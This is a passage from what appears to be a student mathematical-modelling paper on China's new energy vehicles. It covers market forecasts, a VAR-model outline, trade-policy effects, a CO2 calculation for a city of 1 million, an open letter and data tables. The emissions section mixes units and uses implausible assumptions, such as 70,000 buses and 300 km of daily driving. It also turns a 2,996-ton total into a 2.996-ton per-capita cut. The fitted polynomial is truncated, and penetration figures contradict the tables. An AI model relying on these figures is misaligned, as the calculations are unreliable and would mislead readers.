/></p>\n<p><em><strong>*Picture10 The variation curve of each variable over the year（1）*</strong></em></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/2wXANi7ZkCgn4FW.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture11 Comparison of Market Penetration Rates of Conventional and New Energy Vehicles*</strong></em></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/5PZpFxaSj2vr8Xo.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture12 The variation curve of each variable over the year（2）*</strong></em></p>\n<p>In summary, I have the following views on the development of new energy vehicles in China in the next decade:</p>\n<p>\\1. In the next decade, the number of new energy vehicles (10000 units) will steadily increase, currently showing a cubic growth, and will continue to grow until reaching a certain order of magnitude and starting to grow steadily and slowly.</p>\n<p>\\2. The scale of the new energy vehicle market (in billions of RMB) will be greatly increased, gradually surpassing the sharp decline in the traditional vehicle market size with increasing derivatives</p>\n<p>\\3. The penetration rate (%) of the new energy vehicle market will gradually increase, ultimately reaching over 70%.</p>\n<p>\\4. The month on month growth rate (%) of new energy vehicles will first increase and then decrease. As the month on month growth is compared to the previous year's growth, the growth rate will not be particularly high in the future, but overall it still shows a growth trend.</p>\n<p>\\5. The number of new energy vehicle enterprises will increase. As new energy vehicles are an emerging market, manufacturers such as Tesla will make a lot of money, which will attract more manufacturers to enter new energy. At present, the most representative manufacturers are Huawei's Wenjie and Xiaomi Motors.</p>\n<p>The number of patent applications for new energy vehicles will gradually increase, and then gradually decrease. Due to the current peak period of new energy vehicle development, it is normal for patents to spring up one after another. As the new energy industry gradually matures in the future, the number of patents will decrease.</p>\n<p>\\7. The scale of the new energy vehicle industry chain will gradually increase, consistent with the conclusion in 5</p>\n<p>The number of new energy vehicle charging stations (10000) will be significantly increased to adapt to the increasing holdings of new energy vehicles and attract new customers.</p>\n<p>\\9. The coverage rate (%) of new energy vehicle charging infrastructure will be significantly increased, for the same reason.</p>\n<p>The most important thing is that the sales of new energy vehicles will also steadily increase. In short, the development of new energy electric vehicles in China in the next 10 years will be very promising, and the future is bound to be limitless!</p>\n<p><em><strong>*5.3*</strong></em> <em><strong>*Collect data and establish a mathematical model to analyze the impact of new energy electric vehicles on the global traditional energy vehicle industry.*</strong></em></p>\n<h3 id=\"data-preparation-and-preprocessing\"><a class=\"anchor\" href=\"#data-preparation-and-preprocessing\">#</a> Data Preparation and Preprocessing:</h3>\n<p>Data Organization: Transform raw data into an analyzable format, ensuring correct data types for each variable (e.g., years as date format, sales volumes as numerical values).</p>\n<p>Missing Values: Inspect the dataset for any missing entries. If present, choose to impute (using methods like mean of neighboring values, median, or regression prediction based on other variables) or to exclude missing records.</p>\n<p>Outlier Analysis: Identify and scrutinize outliers to determine whether they result from input errors or natural fluctuations. Correct or exclude errors; retain natural fluctuations as they may represent real-world scenarios.</p>\n<p>Normalization/Standardization: Apply normalization or standardization techniques (such as Z-score standardization) to adjust the scale of data, eliminating the influence of different variable magnitudes.</p>\n<h3 id=\"exploratory-data-analysis-eda\"><a class=\"anchor\" href=\"#exploratory-data-analysis-eda\">#</a> Exploratory Data Analysis (EDA):</h3>\n<p>Time Series Analysis: Plot time series for each variable to observe trends and patterns over time, identifying any evident trends or seasonality.</p>\n<p>Scatter Plot Analysis: Create scatter plots to explore relationships between variables, such as the relationship between electric vehicle sales and crude oil prices.</p>\n<p>Correlation Matrix Visualization: Construct a correlation matrix and visualize it to discern linear relationships between variables, aiding in variable selection for the VAR model.</p>\n<h3 id=\"correlation-analysis\"><a class=\"anchor\" href=\"#correlation-analysis\">#</a> Correlation Analysis:</h3>\n<p>Pearson Correlation Coefficient: Compute the Pearson correlation coefficient between electric vehicle sales, traditional vehicle sales, and crude oil prices to quantitatively describe their linear relationships.</p>\n<p>Significance Testing: Perform tests to ascertain the statistical significance of the correlation coefficients, thus determining the reliability of the relationships between variables.</p>\n<h3 id=\"causality-testing\"><a class=\"anchor\" href=\"#causality-testing\">#</a> Causality Testing:</h3>\n<p>Granger Causality Test: Conduct Granger causality tests to determine if one variable's historical values can significantly predict future values of another, thereby establishing a Granger cause.</p>\n<p>Lag Selection: Choose the number of lags to use in Granger causality testing, typically selected based on information criteria such as AIC or BIC.</p>\n<h3 id=\"var-model-construction\"><a class=\"anchor\" href=\"#var-model-construction\">#</a> VAR Model Construction:</h3>\n<p>Variable Selection: Based on EDA and correlation analysis outcomes, select appropriate variables for the VAR model.</p>\n<p>Model Estimation: Estimate the VAR model's parameters using the ordinary least squares method.</p>\n<p>Lag Structure Determination: Determine the optimal lag order for the VAR model using information criteria.</p>\n<h3 id=\"model-estimation-and-testing\"><a class=\"anchor\" href=\"#model-estimation-and-testing\">#</a> Model Estimation and Testing:</h3>\n<p>Model Diagnostics: Conduct diagnostic tests, including tests for autocorrelation of residuals, heteroscedasticity, and model stability.</p>\n<p>Predictive Accuracy: Assess the model's predictive accuracy, often by reserving a portion of data as a test set.</p>\n<h3 id=\"model-interpretation-and-policy-analysis\"><a class=\"anchor\" href=\"#model-interpretation-and-policy-analysis\">#</a> Model Interpretation and Policy Analysis:</h3>\n<p>Impact Interpretation: Interpret the results of the VAR model, discussing how the growth in electric vehicle sales dynamically influences the sales of traditional energy vehicles.</p>\n<p>Policy Impact Discussion: Explore how electric vehicle-related policies might affect the relationships between these variables and how policymakers can utilize these findings.</p>\n<p>External Factors Consideration: Discuss potential external factors that may impact the markets for electric vehicles and traditional energy vehicles, and how these factors might be incorporated into future research.</p>\n<h3 id=\"translated-conclusions\"><a class=\"anchor\" href=\"#translated-conclusions\">#</a> Translated Conclusions:</h3>\n<p>The data indicates that the market share of electric vehicles grew from 0.4% in 2013 to 18.6% in 2022, a substantial increase that correlates with a decline in traditional energy vehicle sales. Specifically, as electric vehicle sales have risen, traditional vehicle sales have demonstrated a downward trend. This suggests a shift in consumer preferences and the impact of reduced costs and technological advancements in electric vehicles, attracting more buyers.</p>\n<p>The increase in the electric vehicle market share significantly correlates with a decrease in the average fuel consumption of traditional vehicles. This suggests that automobile manufacturers may be enhancing the fuel efficiency of traditional vehicles to compete with electric vehicles, or consumers may be increasingly opting for models with lower fuel consumption.</p>\n<p>While the growth in electric vehicle market share has not directly impacted crude oil prices (the correlation is not significant), it does not preclude the potential for long-term effects on the energy market. As electric vehicle costs continue to decrease and policies further support, the demand for traditional fuel vehicles might decline, potentially affecting future crude oil demand and prices.</p>\n<p>In conclusion, the emergence of electric vehicles is gradually impacting the global traditional energy vehicle industry. Specifically, with the continuing expansion of the electric vehicle market share, global sales of traditional vehicles have begun to be affected, as indicated by decreasing sales. Meanwhile, the traditional vehicle industry's technological adaptation is reflected in improved fuel efficiency and reduced consumption. However, so far, the rise in the electric vehicle market has not had a significant impact on crude oil prices, which may be due to the crude oil market being influenced by a variety of factors, including global economic activity levels, international political situations, and the development of alternative energy markets.</p>\n<p><em><strong>*5.4 Some countries have formulated a series of policies targeted to resist the*</strong></em> <em><strong>*development of new energy electric vehicles in China. Establish a mathematical model to*</strong></em> <em><strong>*analyze the effects of these policies on the development of new energy electric vehicles in China.*</strong></em></p>\n<p><em><strong>*（1）Policy*</strong></em> <em><strong>*Collection*</strong></em></p>\n<p>​\tIn June 2022, Germany and Japan were strongly opposed to new energy sources.</p>\n<p>On 16 August 2022 the Inflation Reduction Act (IRA) was signed into law, under which only electric vehicles assembled in North America are eligible for tax credits.</p>\n<p>On 4 October 2023, the EU launched a countervailing investigation into China's new battery electric vehicles.</p>\n<p><em><strong>*（2）*</strong></em><em><strong>*Data collection*</strong></em></p>\n<p>In order to analyse these policies on the development of new energy electric vehicles in China, we collected the export volume of new energy vehicles from 2011 to 2023, As shown in the figure below</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/6mILXTDCbUc7htY.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture13 New Energy Vehicle Export Volume scatterplot*</strong></em></p>\n<p>The anomaly is removed due to the impact of the New Crown Epidemic, which resulted in a decrease rather than an increase in exports of new energy electric vehicles in 2020</p>\n<p>As the above policies are concentrated in 2022 as well as 2023, we fitted a non-linear fit to the data as shown in the following figure, to specifically compare exports in 2022 and 2023.</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/04/nudLeiwcsNBbSXJ.png\" alt=\"image.png\" /></p>\n<p><em><strong>*Picture14 New Energy Vehicle Export Volume and Time curve*</strong></em></p>\n<p>Get the polynomial function:</p>\n<p>y=-0.0049x6-59.72x5+301061x4 \t\t\t\t\t\t\t\t\t <em><strong>*（5）*</strong></em></p>\n<p>Comparing the estimates of new energy vehicle exports corresponding to the fitted curves with the actual data using the fitted curves, it can be seen that these policies have indeed inhibited the development of new energy electric vehicles in China.</p>\n<p><em><strong>*5*</strong></em><em><strong>*.5 Analyze the impact of the electrification of new energy electric vehicles (including*</strong></em> <em><strong>*electric buses) in cities on the ecological environment. Assuming that there is an urban*</strong></em> <em><strong>*population of 1 million, provide the calculation results of the model.*</strong></em></p>\n<p><em><strong>*(*</strong></em><em><strong>*1) Data Collection*</strong></em></p>\n<p>The carbon emission factor for petrol is 2.951kg-CO2/kg, each liter of petrol weights approximately 750g, total combustion produces 2.194kg CO2, the average fuel consumption of a conventional car is 6.46L/ 100 kilometres, The resulting 100 km for conventional cars CO2 emissions: 14.17kg/km, average fuel consumption of conventional buses is 25L/100km, conventional buses 100km CO2 emissions: 54.85kg/km;</p>\n<p>grid carbon intensity is 0.65kg/kWh, and the average electric vehicle power consumption is 15kWh/100km, resulting in 100km CO2 emissions from electric vehicles: 9.75kg/100km, electric buses on average Electricity consumption is 56.6kWh/100km, CO2 emission of 100km from electric bus: 36.79kg/km.</p>\n<p><em><strong>*(*</strong></em><em><strong>*2)*</strong></em> <em><strong>*model assumption*</strong></em></p>\n<p>​\tThe population of the city is 1 million, assuming that there are on average 3 people in a household, and each household has a car, i.e., there are 333,000 cars in the city; there are 70,000 buses in the city. The average journey of a car in a day is 300km, which gives the difference in CO2 emissions between new energy electric cars and traditional cars as 48.4 tons/vehicle<em>per year, and the difference in CO2 emissions between new energy electric buses and traditional buses as 197.76 tons/vehicle</em>per year, and the difference in the total annual CO2emissions between new energy electric vehicles and traditional vehicles as 2,996 tons, and China's average per capita carbon emissions as 6.8 tons. When all vehicles in the city are replaced with new energy vehicles, the city's per capita carbon emissions can be reduced by 2.996 tons, a whopping 44%!</p>\n<p><em><strong>*5.*</strong></em><em><strong>*6*</strong></em> <em><strong>*Based on the conclusion of question 5, write an open letter to the citizens to publicize the benefits of new energy electric vehicles and the contributions of the electric vehicle industry in various countries around the world.*</strong></em></p>\n<p>Dear Citizens,</p>\n<p>In our journey towards a sustainable future, the emergence and expansion of new energy electric vehicles (EVs) stand as a testament to our collective commitment to environmental stewardship and technological innovation. These vehicles, characterized by their minimal environmental footprint, are pivotal in reducing urban pollution and enhancing air quality. Unlike their traditional counterparts, EVs convert energy with remarkable efficiency, offering a sustainable alternative that aligns with the global imperative to conserve resources.</p>\n<p>In addition to their environmental benefits, electric vehicles are driving technological advancements across multiple sectors, including battery technology, smart connectivity, and autonomous driving systems. This evolution is not just a leap in vehicular technology but a catalyst for broader socio-economic changes. Economically, EVs present a cost-effective solution for consumers, promising lower long-term operating and maintenance expenses.</p>\n<p>Globally, countries have been contributing significantly to this transformative movement. China, for instance, has solidified its position as a leader in the EV market, boasting record-breaking sales and a rapidly increasing market penetration. The Chinese government's robust policies under its dual carbon goals have been instrumental in catalyzing this growth, demonstrating a commitment to high-quality industry development. Concurrently, the United States has embarked on an ambitious plan to integrate EVs into its national fabric. With strategic investments in infrastructure and manufacturing, driven by comprehensive legislative support like the Bipartisan Infrastructure Law and the Inflation Reduction Act, the U.S. is poised to significantly influence the global EV landscape.</p>\n<p>Similarly, the European Union's initiatives have been pivotal in driving EV adoption. By implementing stringent CO2 emission standards, the EU has not only promoted environmentally friendly vehicles but also spurred innovation in green technologies. The collaborative efforts of European nations in policy formulation and infrastructure development further underline a shared vision for a green and sustainable future.</p>\n<p>As we embrace this era of electric vehicles, it is evident that our choices transcend beyond individual preferences to a collective responsibility towards a greener, more efficient, and sustainable world. The commitment and actions of countries like China, the United States, and the European Union reflect a global paradigm shift, one where the adoption of electric vehicles is a key component in our pursuit of environmental sustainability and economic resilience.</p>\n<p>In closing, the journey towards a sustainable future is not a solitary endeavor but a collaborative effort that requires the participation and support of each one of us. As we continue to witness and contribute to this transformation, let us remember that each step towards embracing electric vehicles is a step towards a cleaner and more sustainable world.</p>\n<p>Sincerely</p>\n<p>2023-11-25</p>\n<p><em><strong>*Appendix*</strong></em></p>\n<p>Data</p>\n<table>\n<thead>\n<tr>\n<th>Data</th>\n<th>Data sources</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Market share of new energy vehicles, etc.</td>\n<td>NDANEV：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5uZGFuZXYuY29tLw==\">http://www.ndanev.com/</span></td>\n</tr>\n<tr>\n<td>Market penetration of new energy vehicles and conventional vehicles</td>\n<td>National Bureau of Statistics, Ministry of Industry and Information Technology, New Energy Vehicle Association</td>\n</tr>\n<tr>\n<td>China's total annual carbon emissions</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzE5ODk1MjQ3\">https://www.thepaper.cn/newsDetail_forward_19895247</span></td>\n</tr>\n<tr>\n<td>Number of new energy vehicle patents</td>\n<td>China Patent Publication Announcement Network</td>\n</tr>\n<tr>\n<td>Development of New Energy Vehicle Battery</td>\n<td>China ICT</td>\n</tr>\n<tr>\n<td>Infrastructure coverage and number of charging piles for new energy vehicles</td>\n<td>Data Center for Resource and Environmental Sciences, Chinese Academy of Sciences</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>新能源汽车销量（万 / 辆）</td>\n<td></td>\n<td></td>\n<td>年份</td>\n<td>市场占有率（%）</td>\n<td></td>\n<td></td>\n<td>年份</td>\n<td>电池平均能量密度（Wh/kg）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>-----------------------</td>\n<td>----</td>\n<td>----</td>\n<td>----</td>\n<td>---------------</td>\n<td>----</td>\n<td>----</td>\n<td>----</td>\n<td>-------------------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>50.7</td>\n<td></td>\n<td></td>\n<td>2016</td>\n<td>1.8</td>\n<td></td>\n<td></td>\n<td>2016</td>\n<td>75</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>77.7</td>\n<td></td>\n<td></td>\n<td>2017</td>\n<td>2.7</td>\n<td></td>\n<td></td>\n<td>2017</td>\n<td>95</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>126.8</td>\n<td></td>\n<td></td>\n<td>2018</td>\n<td>4.5</td>\n<td></td>\n<td></td>\n<td>2018</td>\n<td>105</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>120.6</td>\n<td></td>\n<td></td>\n<td>2019</td>\n<td>4.68</td>\n<td></td>\n<td></td>\n<td>2019</td>\n<td>140</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>140.9</td>\n<td></td>\n<td></td>\n<td>2020</td>\n<td>5.4</td>\n<td></td>\n<td></td>\n<td>2020</td>\n<td>153</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>352.9</td>\n<td></td>\n<td></td>\n<td>2021</td>\n<td>23.5</td>\n<td></td>\n<td></td>\n<td>2021</td>\n<td>215</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>689.9</td>\n<td></td>\n<td></td>\n<td>2022</td>\n<td>25.6</td>\n<td></td>\n<td></td>\n<td>2022</td>\n<td>280</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>945.9</td>\n<td></td>\n<td></td>\n<td>2023</td>\n<td>30.4</td>\n<td></td>\n<td></td>\n<td>2023</td>\n<td>300</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>电机效率（%）</td>\n<td></td>\n<td></td>\n<td>年份</td>\n<td>充电桩数量（万个）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>-------------</td>\n<td>----</td>\n<td>----</td>\n<td>----</td>\n<td>------------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>80-88</td>\n<td>84</td>\n<td></td>\n<td>2016</td>\n<td>16.6</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>85-90</td>\n<td>87.5</td>\n<td></td>\n<td>2017</td>\n<td>45</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>88-92</td>\n<td>90</td>\n<td></td>\n<td>2018</td>\n<td>77.7</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>90-95</td>\n<td>93</td>\n<td></td>\n<td>2019</td>\n<td>121.9</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>91-96</td>\n<td>93.5</td>\n<td></td>\n<td>2020</td>\n<td>168.1</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>92-97</td>\n<td>94.5</td>\n<td></td>\n<td>2021</td>\n<td>261.7</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>93-98</td>\n<td>95.5</td>\n<td></td>\n<td>2022</td>\n<td>521</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>94-98</td>\n<td>96</td>\n<td></td>\n<td>2023</td>\n<td>795.4</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>补贴估计值（万）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>----------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>5</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>7</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>6</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>4</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>3.5</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>2</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>1.5</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>产业协同率（%）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>---------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>35</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>40</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>45</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>50</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>55</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>60</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>65</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>70</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>中国新能源汽车产量（万辆）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>--------------------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>51.7</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>79.4</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>127.9</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>124.9</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>145.9</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>367.8</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>700.8</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>1000</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>新能源汽车产量增长率（%）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>-------------------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>53</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>53.3</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>79.5</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>0.11</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>7.5</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>145.6</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>96.9</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>40</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>中国燃油车产量（万辆）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>----------------------</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>2819</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>2942.5</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>2781</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>2456</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>2531.1</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>2458.8</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>1508.1</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>1955.7</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>新能源汽车保有量（万辆）</td>\n<td>新能源汽车市场规模（亿元人民币）</td>\n<td>新能源汽车企业数量（家）</td>\n<td>新能源汽车专利申请数量（项）</td>\n<td>新能源汽车产业链规模（家）</td>\n<td>新能源汽车充电桩数量（万个）</td>\n<td>新能源汽车充电基础设施覆盖率（%）</td>\n<td>新能源汽车补贴金额（亿元人民币）</td>\n<td>传统燃油车市场渗透率（%）</td>\n<td>新能源汽车市场渗透率（%）</td>\n<td>长三角地区碳排放总量 (百万吨)</td>\n<td>新能源汽车产销量（万辆）</td>\n<td>新能源汽车环比增长率 (%)</td>\n<td>传统汽车产销量（万辆）</td>\n<td>传统汽车环比增长率 (%)</td>\n<td>磷酸铁锂动力电池装机量 / GWh</td>\n<td>三元电池装机量 / GWh</td>\n<td>碳排放总量 (百万吨)</td>\n<td>新能源汽车加权平均价格 (万元)</td>\n</tr>\n<tr>\n<td>----</td>\n<td>------------------------</td>\n<td>--------------------------------</td>\n<td>------------------------</td>\n<td>----------------------------</td>\n<td>--------------------------</td>\n<td>----------------------------</td>\n<td>---------------------------------</td>\n<td>--------------------------------</td>\n<td>-------------------------</td>\n<td>-------------------------</td>\n<td>----------------------------</td>\n<td>------------------------</td>\n<td>-----------------------</td>\n<td>----------------------</td>\n<td>---------------------</td>\n<td>--------------------------</td>\n<td>------------------</td>\n<td>------------------</td>\n<td>----------------------------</td>\n</tr>\n<tr>\n<td>2013</td>\n<td>0.2</td>\n<td>7.3</td>\n<td>30</td>\n<td>630</td>\n<td>230</td>\n<td>0.3</td>\n<td>0.5</td>\n<td>6.2</td>\n<td>99.9</td>\n<td>0.1</td>\n<td>1608.79</td>\n<td>1.79</td>\n<td>39.8</td>\n<td>2198.3</td>\n<td>15</td>\n<td>2</td>\n<td>15</td>\n<td>9839.7</td>\n<td>18</td>\n</tr>\n<tr>\n<td>2014</td>\n<td>1.2</td>\n<td>25.4</td>\n<td>50</td>\n<td>870</td>\n<td>280</td>\n<td>0.6</td>\n<td>1.7</td>\n<td>7.5</td>\n<td>99.6</td>\n<td>0.4</td>\n<td>1569.41</td>\n<td>7.48</td>\n<td>317.9</td>\n<td>2341.2</td>\n<td>6.5</td>\n<td>5</td>\n<td>20</td>\n<td>10029.8</td>\n<td>18.5</td>\n</tr>\n<tr>\n<td>2015</td>\n<td>3.3</td>\n<td>71.5</td>\n<td>70</td>\n<td>1020</td>\n<td>320</td>\n<td>1.2</td>\n<td>3.5</td>\n<td>9.8</td>\n<td>98.7</td>\n<td>1.3</td>\n<td>1578.45</td>\n<td>33.01</td>\n<td>341.4</td>\n<td>2406.5</td>\n<td>2.8</td>\n<td>6.1</td>\n<td>26.9</td>\n<td>9980.2</td>\n<td>19</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>7.3</td>\n<td>162.5</td>\n<td>90</td>\n<td>1170</td>\n<td>370</td>\n<td>3.5</td>\n<td>8.7</td>\n<td>13.2</td>\n<td>98.2</td>\n<td>1.8</td>\n<td>1496.37</td>\n<td>50.71</td>\n<td>53.6</td>\n<td>2801.5</td>\n<td>16.4</td>\n<td>21.8</td>\n<td>28.9</td>\n<td>9861</td>\n<td>19.5</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>16.7</td>\n<td>331.5</td>\n<td>120</td>\n<td>1360</td>\n<td>420</td>\n<td>8.2</td>\n<td>17.2</td>\n<td>19.6</td>\n<td>97.4</td>\n<td>2.6</td>\n<td>1602.22</td>\n<td>77.68</td>\n<td>53.3</td>\n<td>2871.5</td>\n<td>2.5</td>\n<td>39.9</td>\n<td>37.8</td>\n<td>10058.8</td>\n<td>20</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>31.7</td>\n<td>609.5</td>\n<td>150</td>\n<td>1470</td>\n<td>460</td>\n<td>15.6</td>\n<td>30.5</td>\n<td>28.4</td>\n<td>96.4</td>\n<td>3.6</td>\n<td>1602.72</td>\n<td>125.6</td>\n<td>61.7</td>\n<td>2791.7</td>\n<td>-2.8</td>\n<td>79.9</td>\n<td>45.7</td>\n<td>10291.8</td>\n<td>20.5</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>57.2</td>\n<td>956.7</td>\n<td>180</td>\n<td>1610</td>\n<td>500</td>\n<td>28.4</td>\n<td>52.3</td>\n<td>38.7</td>\n<td>95.3</td>\n<td>4.7</td>\n<td>1623.18</td>\n<td>120.6</td>\n<td>-4.0</td>\n<td>2535.4</td>\n<td>-9.2</td>\n<td>79.8</td>\n<td>49.8</td>\n<td>10492.5</td>\n<td>21</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>94.3</td>\n<td>1521.6</td>\n<td>220</td>\n<td>1750</td>\n<td>550</td>\n<td>44.7</td>\n<td>77.9</td>\n<td>46.3</td>\n<td>94.3</td>\n<td>5.7</td>\n<td>1649.15</td>\n<td>136.8</td>\n<td>13.4</td>\n<td>2023.1</td>\n<td>-20.2</td>\n<td>96.3</td>\n<td>61.6</td>\n<td>10713.5</td>\n<td>21.5</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>127.9</td>\n<td>2002.5</td>\n<td>250</td>\n<td>1900</td>\n<td>590</td>\n<td>59.1</td>\n<td>80.2</td>\n<td>53.9</td>\n<td>93.6</td>\n<td>6.4</td>\n<td>1675.53</td>\n<td>352.1</td>\n<td>157.6</td>\n<td>2334.1</td>\n<td>15.4</td>\n<td>183.8</td>\n<td>110.4</td>\n<td>10934.6</td>\n<td>22</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>164.5</td>\n<td>2483.4</td>\n<td>280</td>\n<td>2000</td>\n<td>630</td>\n<td>74.2</td>\n<td>87.6</td>\n<td>61.5</td>\n<td>92.7</td>\n<td>7.3</td>\n<td>1702.35</td>\n<td>688.7</td>\n<td>95.6</td>\n<td>1997.7</td>\n<td>-14.4</td>\n<td>184.5</td>\n<td>117.3</td>\n<td>11155.6</td>\n<td>22.5</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>年份</td>\n<td>新能源汽车保有量（万辆）</td>\n<td>新能源汽车市场规模（亿元人民币）</td>\n<td>新能源汽车专利申请数量（项）</td>\n<td>新能源汽车补贴金额（亿元人民币）</td>\n<td>碳排放总量 (百万吨)</td>\n<td>磷酸铁锂动力电池装机量 / GWh</td>\n<td>三元电池装机量 / GWh</td>\n<td>新能源汽车加权平均价格 (万元)</td>\n<td>新能源汽车市场渗透率（%）</td>\n</tr>\n<tr>\n<td>----</td>\n<td>------------------------</td>\n<td>--------------------------------</td>\n<td>----------------------------</td>\n<td>--------------------------------</td>\n<td>------------------</td>\n<td>--------------------------</td>\n<td>------------------</td>\n<td>----------------------------</td>\n<td>-------------------------</td>\n</tr>\n<tr>\n<td>2013</td>\n<td>0.2</td>\n<td>7.3</td>\n<td>630</td>\n<td>6.2</td>\n<td>9839.7</td>\n<td>2</td>\n<td>15</td>\n<td>18</td>\n<td>0.1</td>\n</tr>\n<tr>\n<td>2014</td>\n<td>1.2</td>\n<td>25.4</td>\n<td>870</td>\n<td>7.5</td>\n<td>10029.8</td>\n<td>5</td>\n<td>20</td>\n<td>18.5</td>\n<td>0.4</td>\n</tr>\n<tr>\n<td>2015</td>\n<td>3.3</td>\n<td>71.5</td>\n<td>1020</td>\n<td>9.8</td>\n<td>9980.2</td>\n<td>6.1</td>\n<td>26.9</td>\n<td>19</td>\n<td>1.3</td>\n</tr>\n<tr>\n<td>2016</td>\n<td>7.3</td>\n<td>162.5</td>\n<td>1170</td>\n<td>13.2</td>\n<td>9861</td>\n<td>21.8</td>\n<td>28.9</td>\n<td>19.5</td>\n<td>1.8</td>\n</tr>\n<tr>\n<td>2017</td>\n<td>16.7</td>\n<td>331.5</td>\n<td>1360</td>\n<td>19.6</td>\n<td>10058.8</td>\n<td>39.9</td>\n<td>37.8</td>\n<td>20</td>\n<td>2.6</td>\n</tr>\n<tr>\n<td>2018</td>\n<td>31.7</td>\n<td>609.5</td>\n<td>1470</td>\n<td>28.4</td>\n<td>10291.8</td>\n<td>79.9</td>\n<td>45.7</td>\n<td>20.5</td>\n<td>3.6</td>\n</tr>\n<tr>\n<td>2019</td>\n<td>57.2</td>\n<td>956.7</td>\n<td>1610</td>\n<td>38.7</td>\n<td>10492.5</td>\n<td>79.8</td>\n<td>49.8</td>\n<td>21</td>\n<td>4.7</td>\n</tr>\n<tr>\n<td>2020</td>\n<td>94.3</td>\n<td>1521.6</td>\n<td>1750</td>\n<td>46.3</td>\n<td>10713.5</td>\n<td>96.3</td>\n<td>61.6</td>\n<td>21.5</td>\n<td>5.7</td>\n</tr>\n<tr>\n<td>2021</td>\n<td>127.9</td>\n<td>2002.5</td>\n<td>1900</td>\n<td>53.9</td>\n<td>10934.6</td>\n<td>183.8</td>\n<td>110.4</td>\n<td>22</td>\n<td>6.4</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>164.5</td>\n<td>2483.4</td>\n<td>2000</td>\n<td>61.5</td>\n<td>11155.6</td>\n<td>184.5</td>\n